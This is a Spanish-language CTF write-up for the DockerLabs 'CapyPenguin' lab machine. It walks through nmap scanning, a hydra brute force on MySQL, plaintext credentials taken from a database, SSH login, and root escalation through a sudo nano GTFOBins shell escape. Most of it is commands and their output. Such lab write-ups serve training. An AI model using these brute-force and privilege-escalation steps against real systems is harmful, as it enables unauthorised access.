---
title: CapyPenguin Writeup - DockerLabs
date: 2024-08-09
categories: [WriteUps, DockerLabs]
tags: [Linux, Easy, DockerLabs]
img_path: /assets/img/dck/capy_penguin/
image: /assets/img/dck/capy_penguin/capy_penguin.png
---

## Reconocimiento

Empezamos realizando un escaneo a la máquina objetivo con nmap, para ver que puertos tiene abiertos.

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
_______________________________________________________________________
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
```

---
Tiene abierto los puertos 22 (ssh), 80 (http) y 3306 (mysql). Ahora procedemos a lanzar un conjunto de script básicos y a verificar su versión.

```bash
nmap -sCV -p22,80,3306 172.17.0.2 -oN targeted 
_______________________________________________________________________
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e:6a:3f:89:de:9d:05:d9:94:32:73:8d:31:e0:a5:eb (ECDSA)
|_  256 e7:ef:4f:4a:25:86:c9:55:b0:88:0a:8c:79:03:d0:9f (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Web de Capybaras
|_http-server-header: Apache/2.4.52 (Ubuntu)
3306/tcp open  mysql   MySQL 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
|   Thread ID: 35
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, FoundRows, SupportsTransactions, LongColumnFlag, IgnoreSpaceBeforeParenthesis, ODBCClient, ConnectWithDatabase, SupportsLoadDataLocal, SupportsCompression, InteractiveClient, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: Hmof0ZTw|*X^NLqtr_fd
|_  Auth Plugin Name: mysql_native_password
```
---
## Enumeración

Como sabemos que tiene el servicio http corriendo por el puerto 80, vamos a revisar la página web en busca de información relevante, e incluso inspeccionar el código.

![capy_penguin-1](/assets/img/dck/capy_penguin/capy_penguin-1.png)

---
Encontramos a un posible usuario llamado "capybarauser", y que la contraseña se encuentra en las ultimas palabras del rockyou, y usaremos "tac" para que nos devuelva el contenido inverso.

```bash
tac /usr/share/wordlists/rockyou.txt > RockyouInvertido.txt
```
---

## Explotación

Ahora con ayuda de la herramienta hydra, procederemos a realizar un ataque de fuerza bruta al usuario "capybarauser" contra el servicio de mysql, usando este nuevo diccionario.

```bash
hydra -l capybarauser -P RockyouInvertido.txt mysql://172.17.0.2 -t 4
_______________________________________________________________________
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: capybarauser   password: ie168
1 of 1 target successfully completed, 1 valid password found
```
---
Logramos encontrar la contraseña, ahora procedemos a usar estas credenciales para conectarnos al mysql de la máquina objetivo.

```bash
mysql -h 172.17.0.2 -u capybarauser -pie168
_______________________________________________________________________
MariaDB [(none)]> 
```

Una vez dentro, comenzamos a enumerar la base de datos.

```sql
MariaDB [(none)]> SHOW DATABASES;
_______________________________________________________________________
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| pinguinasio_db     |
| sys                |
+--------------------+
5 rows in set (0.003 sec)
```

Encontramos la base de datos pinguinasio_db, así que usaremos esa y mostraremos las tablas.
```sql
MariaDB [(none)]> USE pinguinasio_db;
--------------------------------------------------
MariaDB [pinguinasio_db]> SHOW TABLES;
_______________________________________________________________________
+--------------------------+
| Tables_in_pinguinasio_db |
+--------------------------+
| users                    |
+--------------------------+
1 row in set (0.000 sec)
```

Vamos a ver todas las columnas de la tabla users.
```sql
MariaDB [pinguinasio_db]> SELECT * FROM users;
_______________________________________________________________________
+----+-------+------------------+
| id | user  | password         |
+----+-------+------------------+
|  1 | mario | pinguinomolon123 |
+----+-------+------------------+
1 row in set (0.000 sec)
```

---
Vemos que existe un usuario llamado "mario" con su contaseña "pinguinomolon123". Posiblemente podemos usarlo para conectarnos por SSH.

```bash
ssh mario@172.17.0.2
mario@172.17.0.2's password: pinguinomolon123
_______________________________________________________________________
mario@54bec2b5e6ff:~$ 
```

Logramos tener acceso a la máquina objetivo, ahora haremos un Tratamiento de la TTY para poder trabajar cómodamente por la consola.

```bash
script /dev/null -c bash
# Presionamos "Control + Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 41 columns 183
```
---

## Escalada de Privilegios

Ahora procederemos a hacer una escala de privilegios. Lista los comandos que un usuario puede ejecutar con privilegios elevados.

```bash
mario@54bec2b5e6ff:~$ sudo -l
_______________________________________________________________________
    (ALL : ALL) NOPASSWD: /usr/bin/nano
```

Vemos que podemos ejecutar nano como el usuario root, sin proporcionar contraseña, nos ayudaremos de GTFObins para ver el procedimiento que debemos realizar.
```bash
sudo nano
# Adentro de Nano presionamos Ctrl+R y luego Ctrl+X
reset; bash 1>&0 2>&0
```

Y logramos conseguir ser root en la máquina objetivo.
```bash
root@54bec2b5e6ff:/home/mario# whoami
_______________________________________________________________________
root
```